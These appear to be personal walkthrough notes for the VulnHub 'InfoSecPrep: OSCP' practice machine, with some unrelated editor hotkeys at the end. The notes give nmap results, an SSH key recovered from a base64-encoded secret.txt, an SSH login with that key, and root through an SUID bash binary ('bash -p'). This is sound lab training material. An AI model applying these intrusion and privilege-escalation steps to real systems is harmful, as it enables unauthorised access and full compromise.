
---
VulnHub Link: https://download.vulnhub.com/infosecprep/oscp.zip

\[OS]: Ubuntu
\[Web-Technology]: Apache 2.4.41 
\[Hostname]:  OSCP
\[IP]:  10.0.0.9  
\[USERS]:   oscp
\[CREDENTIALS]:  
oscp :: rsa.id - ssh key

---
\[To-Try LIST]:  
80 http -> robots.txt  disallows  **secret.txt**, Wordpress 5.4.2- WPScan

33060 - MySQL X 

22 ssh - need credentials



---
\[NMAP RESULTS]:  
ORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: OSCP Voucher &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-generator: WordPress 5.4.2
33060/tcp open  mysqlx  MySQL X protocol listener
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: bridge|VoIP adapter|general purpose
Running (JUST GUESSING): Oracle Virtualbox (98%), Slirp (98%), AT&T embedded (95%), QEMU (94%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:danny_gasparovski:slirp cpe:/a:qemu:qemu
Aggressive OS guesses: Oracle Virtualbox Slirp NAT bridge (98%), AT&T BGW210 voice gateway (95%), QEMU user mode network gateway (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


--- 

\[Web Services Enumeration]:   


Web Page - says only users is **oscp**
Source code - nothing
robots.txt > secret.txt > base64 encoded output -> RSA Key 

Save to rsa.id 
```bash
#change so only owner can rw
chmod 600 /home/jesse/Machines/OSCP/credentials/rsa.id

ssh -i /home/jesse/Machines/OSCP/credentials/rsa.id oscp@$IP

#SUCCESS

# Other options - wpscan, searchsploit, dirbuster
```


---
\[OTHER / PRIVILEGE-ESCALATION]:   
![[Pasted image 20251101042810.png]]
Normal S1ren Privesc
```
Installed: perl, wget, curl, nc

find / -perm -u=s -type f 2>/dev/null
#SUID on /usr/bin/bash

/usr/bin/bash -p

#Now we are root

```

![[Pasted image 20251101043629.png]]

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
